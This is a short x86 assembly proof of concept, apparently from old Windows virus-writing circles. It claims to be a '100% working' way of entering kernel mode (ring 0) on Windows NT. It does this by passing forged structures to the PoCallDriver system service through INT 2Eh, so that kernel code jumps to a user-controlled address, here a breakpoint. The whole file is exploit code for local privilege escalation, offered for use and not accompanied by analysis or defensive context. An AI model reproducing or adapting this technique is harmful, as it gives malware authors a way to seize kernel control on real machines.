
; EXAMPLE of entering RING-0 via INT 2E -- fn. PoCallDriver
; 100% working version

include                 ntoskrnl.inc

callW                   macro   x
                        extern  x:PROC
                        call    x
                        endm

                        p386
                        model   flat
                        locals  __

                        .data

stk                     dd      offset x1
                        dd      offset x2
x1                      db      8 dup (0)
                        dd      offset x3
x2                      db      60h dup (0)
                        dd      offset x4+24h
x4                      db      18h dup (0)
x3                      db      38h dup (0)
                        dd      ring_0

ring_0:                 int 3

                        add     esp, 16
                        ret

                        .code
start:

                        mov     eax, i2E_PoCallDriver
                        lea     edx, stk
                        int     2eh

                        push    -1
                        callW   ExitProcess

                        end     start
